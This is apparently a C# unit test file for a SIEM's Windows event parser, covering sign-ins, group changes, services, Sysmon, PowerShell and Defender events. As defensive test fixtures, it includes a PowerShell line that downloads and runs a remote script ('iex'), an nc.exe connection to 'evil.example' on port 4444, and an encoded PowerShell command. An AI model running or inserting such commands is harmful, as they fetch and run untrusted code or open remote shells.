using DreaminGeek.Siem.Core;
using DreaminGeek.Siem.Parsers;
using DreaminGeek.Siem.Core.Agents;
using DreaminGeek.Siem.Parsers.Vendors;
using DreaminGeek.Siem.Web.Admin;

namespace DreaminGeek.Siem.Tests;

public sealed class WindowsEventParserTests
{
    private static readonly ParserRegistry Registry = new([new WindowsEventParser(), new AsteriskParser(), new FreeSwitchParser(), new SyslogParser()]);

    private static LogEvent Parse(string channel, string xml) =>
        Registry.Parse(new RawEnvelope(DateTimeOffset.UtcNow, $"wineventlog:{channel}", null, xml), "dg");

    private static string Event(string provider, int id, string channel, string data, string rendering = "", string keywords = "0x8020000000000000", int level = 0, string computer = "WS01.corp.example.com") =>
        $"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='{provider}' Guid='{{54849625-5478-4994-a5ba-3e3b0328c30d}}'/>" +
        $"<EventID>{id}</EventID><Version>2</Version><Level>{level}</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>{keywords}</Keywords>" +
        "<TimeCreated SystemTime='2026-11-12T16:31:16.1234567Z'/><EventRecordID>1234567</EventRecordID><Correlation/>" +
        $"<Execution ProcessID='812' ThreadID='4392'/><Channel>{channel}</Channel><Computer>{computer}</Computer><Security/></System>" +
        data + rendering + "</Event>";

    private static string Data(params (string Name, string Value)[] values) =>
        "<EventData>" + string.Concat(values.Select(v => $"<Data Name='{v.Name}'>{v.Value}</Data>")) + "</EventData>";

    [Fact]
    public void Successful_sign_in()
    {
        var e = Parse("Security", Event("Microsoft-Windows-Security-Auditing", 4624, "Security",
            Data(("SubjectUserSid", "S-1-5-18"), ("SubjectUserName", "WS01$"), ("SubjectDomainName", "WORKGROUP"),
                ("TargetUserSid", "S-1-5-21-1-2-3-1001"), ("TargetUserName", "jdoe"), ("TargetDomainName", "WS01"),
                ("TargetLogonId", "0x2f4a1"), ("LogonType", "10"), ("WorkstationName", "LAPTOP7"),
                ("ProcessId", "0x2b4"), ("ProcessName", "C:\\Windows\\System32\\svchost.exe"), ("IpAddress", "203.0.113.50"), ("IpPort", "51544")),
            "<RenderingInfo Culture='en-US'><Message>An account was successfully logged on.&#13;&#10;&#13;&#10;Subject:</Message><Level>Information</Level><Task>Logon</Task>" +
            "<Opcode>Info</Opcode><Channel>Security</Channel><Provider>Microsoft Windows security auditing.</Provider><Keywords><Keyword>Audit Success</Keyword></Keywords></RenderingInfo>"));

        Assert.Equal("windows.security", e.EventDataset);
        Assert.Equal("windows", e.EventModule);
        Assert.Equal("logged-in", e.EventAction);
        Assert.Equal("success", e.EventOutcome);
        Assert.Equal("jdoe", e.UserName);
        Assert.Equal("WS01", e.Fields["user.domain"]);
        Assert.Equal("S-1-5-21-1-2-3-1001", e.Fields["user.id"]);
        Assert.Equal("203.0.113.50", e.SourceIp);
        Assert.Equal(51544, e.SourcePort);
        Assert.Equal("LAPTOP7", e.Fields["source.domain"]);
        Assert.Equal("RemoteInteractive", e.Fields["winlog.logon.type"]);
        Assert.Equal("svchost.exe", e.Fields["process.name"]);
        Assert.Equal("692", e.Fields["process.pid"]);
        Assert.Equal("4624", e.Fields["event.code"]);
        Assert.Equal("1234567", e.Fields["winlog.record_id"]);
        Assert.Equal("Audit Success", e.Fields["winlog.keywords"]);
        Assert.Equal("WS01.corp.example.com", e.HostName);
        Assert.Equal(new DateTimeOffset(2026, 11, 12, 16, 31, 16, TimeSpan.Zero).AddTicks(1234567), e.Timestamp);
        Assert.StartsWith("An account was successfully logged on.\n\nSubject:", e.Message, StringComparison.Ordinal);
        Assert.Equal("informational", e.LogLevel);
    }

    [Fact]
    public void Failed_sign_in_explains_why()
    {
        var e = Parse("Security", Event("Microsoft-Windows-Security-Auditing", 4625, "Security",
            Data(("TargetUserSid", "S-1-0-0"), ("TargetUserName", "administrator"), ("TargetDomainName", "-"), ("Status", "0xc000006d"),
                ("FailureReason", "%%2313"), ("SubStatus", "0xc000006a"), ("LogonType", "3"), ("IpAddress", "::ffff:45.148.10.12"), ("IpPort", "0")),
            keywords: "0x8010000000000000"));
        Assert.Equal("logon-failed", e.EventAction);
        Assert.Equal("failure", e.EventOutcome);
        Assert.Equal("administrator", e.UserName);
        Assert.False(e.Fields.ContainsKey("user.id"));
        Assert.False(e.Fields.ContainsKey("user.domain"));
        Assert.Equal("45.148.10.12", e.SourceIp);
        Assert.Equal(0, e.SourcePort);
        Assert.Equal("Network", e.Fields["winlog.logon.type"]);
        Assert.Equal("0xc000006a", e.Fields["winlog.logon.failure.status"]);
        Assert.Equal("Wrong password", e.Fields["winlog.logon.failure.reason"]);
        Assert.Equal("Microsoft-Windows-Security-Auditing event 4625", e.Message); // no RenderingInfo
    }

    [Fact]
    public void Group_changes_name_the_actor_group_and_member()
    {
        var e = Parse("Security", Event("Microsoft-Windows-Security-Auditing", 4732, "Security",
            Data(("MemberName", "CN=Jane Doe\\, Jr,OU=Staff,DC=acme,DC=local"), ("MemberSid", "S-1-5-21-9-9-9-1105"),
                ("TargetUserName", "Administrators"), ("TargetDomainName", "Builtin"), ("SubjectUserSid", "S-1-5-21-9-9-9-500"),
                ("SubjectUserName", "jdoe.admin"), ("SubjectDomainName", "Acme"))));
        Assert.Equal("added-member-to-group", e.EventAction);
        Assert.Equal("jdoe.admin", e.UserName);
        Assert.Equal("Administrators", e.Fields["group.name"]);
        Assert.Equal("Jane Doe, Jr", e.Fields["user.target.name"]);
        Assert.Equal("S-1-5-21-9-9-9-1105", e.Fields["user.target.id"]);
        Assert.Equal("iam", e.Fields["event.category"]);
    }

    [Fact]
    public void New_processes_and_cleared_logs()
    {
        var p = Parse("Security", Event("Microsoft-Windows-Security-Auditing", 4688, "Security",
            Data(("SubjectUserName", "jdoe"), ("SubjectDomainName", "DG"), ("NewProcessId", "0x1a2c"), ("NewProcessName", "C:\\Windows\\System32\\cmd.exe"),
                ("ProcessId", "0x1f0"), ("CommandLine", "cmd.exe /c whoami"), ("TargetUserSid", "S-1-0-0"), ("TargetUserName", "-"),
                ("ParentProcessName", "C:\\Windows\\explorer.exe"))));
        Assert.Equal("created-process", p.EventAction);
        Assert.Equal("6700", p.Fields["process.pid"]);
        Assert.Equal("cmd.exe", p.Fields["process.name"]);
        Assert.Equal("cmd.exe /c whoami", p.Fields["process.command_line"]);
        Assert.Equal("explorer.exe", p.Fields["process.parent.name"]);
        Assert.Equal("496", p.Fields["process.parent.pid"]);
        Assert.Equal("jdoe", p.UserName);

        var cleared = Parse("Security", Event("Microsoft-Windows-Eventlog", 1102, "Security",
            "<UserData><LogFileCleared xmlns='http://manifests.microsoft.com/win/2004/08/windows/eventlog'><SubjectUserSid>S-1-5-21-1-2-3-500</SubjectUserSid>" +
            "<SubjectUserName>baduser</SubjectUserName><SubjectDomainName>DG</SubjectDomainName><SubjectLogonId>0x5f1a</SubjectLogonId></LogFileCleared></UserData>"));
        Assert.Equal("audit-log-cleared", cleared.EventAction);
        Assert.Equal("baduser", cleared.UserName);
        Assert.Equal("warning", cleared.LogLevel);
    }

    [Fact]
    public void Services_and_classic_application_events()
    {
        var svc = Parse("System", Event("Service Control Manager", 7045, "System",
            Data(("ServiceName", "PSEXESVC"), ("ImagePath", "%SystemRoot%\\PSEXESVC.exe"), ("ServiceType", "user mode service"),
                ("StartType", "demand start"), ("AccountName", "LocalSystem")), keywords: "0x8080000000000000", level: 4));
        Assert.Equal("windows.system", svc.EventDataset);
        Assert.Equal("service-installed", svc.EventAction);
        Assert.Equal("PSEXESVC", svc.Fields["service.name"]);
        Assert.Equal("%SystemRoot%\\PSEXESVC.exe", svc.Fields["process.executable"]);
        Assert.Equal(string.Empty, svc.EventOutcome);

        var state = Parse("System", Event("Service Control Manager", 7036, "System",
            "<EventData><Data Name='param1'>Windows Update</Data><Data Name='param2'>stopped</Data></EventData>", keywords: "0x8080000000000000", level: 4));
        Assert.Equal("service-state-changed", state.EventAction);
        Assert.Equal("stopped", state.Fields["service.state"]);

        // Classic sources write unnamed <Data> values.
        var crash = Parse("Application", Event("Application Error", 1000, "Application",
            "<EventData><Data>OUTLOOK.EXE</Data><Data>16.0.1</Data></EventData>", keywords: "0x80000000000000", level: 2));
        Assert.Equal("windows.application", crash.EventDataset);
        Assert.Equal("application-crashed", crash.EventAction);
        Assert.Equal("failure", crash.EventOutcome);
        Assert.Equal("error", crash.LogLevel);
        Assert.Equal("OUTLOOK.EXE", crash.Fields["winlog.event_data.param1"]);
        Assert.Equal("OUTLOOK.EXE", crash.Fields["process.name"]);

        // Anything else gets its task name, or event-<id>.
        var other = Parse("Microsoft-Windows-TaskScheduler/Operational", Event("Microsoft-Windows-TaskScheduler", 102, "Microsoft-Windows-TaskScheduler/Operational",
            Data(("TaskName", "\\Backup"), ("UserContext", "DG\\jdoe")), "<RenderingInfo Culture='en-US'><Message>Task completed</Message><Level>Information</Level><Task>Task completed</Task></RenderingInfo>", keywords: "0x8000000000000000", level: 4));
        Assert.Equal("windows.taskscheduler", other.EventDataset);
        Assert.Equal("task-completed", other.EventAction);
        Assert.Equal("\\Backup", other.Fields["winlog.event_data.TaskName"]);
    }

    [Fact]
    public void Sysmon_processes_connections_and_dns()
    {
        const string channel = "Microsoft-Windows-Sysmon/Operational";
        var p = Parse(channel, Event("Microsoft-Windows-Sysmon", 1, channel,
            Data(("RuleName", "technique_id=T1059"), ("ProcessId", "4512"), ("Image", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
                ("OriginalFileName", "PowerShell.EXE"), ("CommandLine", "powershell -enc AAAA"), ("CurrentDirectory", "C:\\Users\\jdoe\\"),
                ("User", "DG\\jdoe"), ("Hashes", "SHA256=ABC123,MD5=DEF456,IMPHASH=0F0F"), ("ParentProcessId", "3010"),
                ("ParentImage", "C:\\Windows\\explorer.exe"), ("ParentCommandLine", "C:\\Windows\\Explorer.EXE")), keywords: "0x8000000000000000", level: 4));
        Assert.Equal("windows.sysmon", p.EventDataset);
        Assert.Equal("sysmon", p.EventModule);
        Assert.Equal("process-created", p.EventAction);
        Assert.Equal("powershell.exe", p.Fields["process.name"]);
        Assert.Equal("4512", p.Fields["process.pid"]);
        Assert.Equal("powershell -enc AAAA", p.Fields["process.command_line"]);
        Assert.Equal("explorer.exe", p.Fields["process.parent.name"]);
        Assert.Equal("abc123", p.Fields["process.hash.sha256"]);
        Assert.Equal("jdoe", p.UserName);
        Assert.Equal("DG", p.Fields["user.domain"]);
        Assert.Equal("technique_id=T1059", p.Fields["rule.name"]);

        var net = Parse(channel, Event("Microsoft-Windows-Sysmon", 3, channel,
            Data(("Image", "C:\\Tools\\nc.exe"), ("User", "DG\\jdoe"), ("Protocol", "tcp"), ("Initiated", "true"), ("SourceIp", "10.1.1.160"),
                ("SourcePort", "50122"), ("DestinationIp", "198.51.100.9"), ("DestinationHostname", "evil.example"), ("DestinationPort", "4444")), keywords: "0x8000000000000000", level: 4));
        Assert.Equal("network-connection", net.EventAction);
        Assert.Equal("10.1.1.160", net.SourceIp);
        Assert.Equal("198.51.100.9", net.DestinationIp);
        Assert.Equal(4444, net.DestinationPort);
        Assert.Equal("tcp", net.NetworkTransport);
        Assert.Equal("outbound", net.Fields["network.direction"]);
        Assert.Equal("evil.example", net.Fields["destination.domain"]);

        var dns = Parse(channel, Event("Microsoft-Windows-Sysmon", 22, channel,
            Data(("Image", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"), ("QueryName", "example.com"), ("QueryStatus", "0"), ("QueryResults", "::ffff:203.0.113.10;")), keywords: "0x8000000000000000", level: 4));
        Assert.Equal("dns-query", dns.EventAction);
        Assert.Equal("dns", dns.NetworkProtocol);
        Assert.Equal("example.com", dns.Fields["dns.question.name"]);
    }

    [Fact]
    public void PowerShell_script_blocks_and_defender_detections()
    {
        var ps = Parse("Microsoft-Windows-PowerShell/Operational", Event("Microsoft-Windows-PowerShell", 4104, "Microsoft-Windows-PowerShell/Operational",
            Data(("MessageNumber", "1"), ("MessageTotal", "1"), ("ScriptBlockText", "Invoke-WebRequest http://x/a.ps1 | iex"), ("ScriptBlockId", "1f2e"), ("Path", "")),
            keywords: "0x0", level: 3).Replace("<Security/>", "<Security UserID='S-1-5-21-1-2-3-1001'/>", StringComparison.Ordinal));
        Assert.Equal("windows.powershell", ps.EventDataset);
        Assert.Equal("script-block-logged", ps.EventAction);
        Assert.Equal("warning", ps.LogLevel); // Windows logs suspicious script blocks as warnings even without policy
        Assert.Equal("Invoke-WebRequest http://x/a.ps1 | iex", ps.Fields["powershell.file.script_block_text"]);
        Assert.Equal("S-1-5-21-1-2-3-1001", ps.Fields["user.id"]);
        Assert.False(ps.Fields.ContainsKey("file.path"));

        const string defender = "Microsoft-Windows-Windows Defender/Operational";
        var detected = Parse(defender, Event("Microsoft-Windows-Windows Defender", 1116, defender,
            Data(("Threat Name", "Trojan:Win32/Wacatac.B!ml"), ("Threat ID", "2147735503"), ("Severity Name", "Severe"), ("Category Name", "Trojan"),
                ("Path", "file:_C:\\Users\\jdoe\\Downloads\\invoice.exe; containerfile:_C:\\x.zip"), ("Detection User", "DG\\jdoe"),
                ("Process Name", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"), ("Action Name", "Quarantine")), keywords: "0x8000000000000000", level: 3));
        Assert.Equal("windows.defender", detected.EventDataset);
        Assert.Equal("malware-detected", detected.EventAction);
        Assert.Equal("alert", detected.Fields["event.kind"]);
        Assert.Equal("Trojan:Win32/Wacatac.B!ml", detected.Fields["threat.name"]);
        Assert.Equal("Severe", detected.Fields["defender.severity"]);
        Assert.Equal("C:\\Users\\jdoe\\Downloads\\invoice.exe", detected.Fields["file.path"]);
        Assert.Equal("jdoe", detected.UserName);
        Assert.Equal("Trojan:Win32/Wacatac.B!ml", detected.Fields["winlog.event_data.Threat_Name"]);

        var off = Parse(defender, Event("Microsoft-Windows-Windows Defender", 5001, defender, Data(), keywords: "0x8000000000000000", level: 4));
        Assert.Equal("real-time-protection-disabled", off.EventAction);
        Assert.Equal("warning", off.LogLevel);
    }

    [Fact]
    public void Only_event_log_input_is_parsed_as_windows_xml()
    {
        var e = Registry.Parse(new RawEnvelope(DateTimeOffset.UtcNow, "syslog-udp", null, "<Event>not from the agent</Event>"), "dg");
        Assert.NotEqual(WindowsEventParser.Module, e.EventModule);
        Assert.Equal("windows.security", WindowsEventParser.DatasetFor("Security"));
        Assert.Equal("windows.directory.service", WindowsEventParser.DatasetFor("Directory Service"));
    }

    [Fact]
    public void Windows_agents_get_the_event_logs_by_default_and_the_config_is_valid()
    {
        var windows = AgentConfig.DefaultFor("windows");
        var input = Assert.Single(windows.Inputs);
        Assert.Equal(InputType.WindowsEventLog, input.Type);
        Assert.Contains(input.Channels!, c => c.Name == "Security");
        var json = System.Text.Json.JsonSerializer.Serialize(windows, AgentJsonContext.Default.AgentConfig);
        Assert.Equal(6, AdminService.ParseAndValidateConfig(json).Inputs[0].Channels!.Count);

        Assert.Equal(InputType.SyslogUdp, AgentConfig.DefaultFor("linux").Inputs[0].Type);
        Assert.Equal(InputType.SyslogUdp, AgentConfig.DefaultFor(null).Inputs[0].Type);

        Assert.Throws<AdminException>(() => AdminService.ParseAndValidateConfig("""{"inputs":[{"type":"WindowsEventLog","channels":[{"name":"Security"},{"name":"security"}]}]}"""));
        Assert.Throws<AdminException>(() => AdminService.ParseAndValidateConfig("""{"inputs":[{"type":"WindowsEventLog","channels":[{"name":"Security","query":"EventID=4624"}]}]}"""));
    }
}
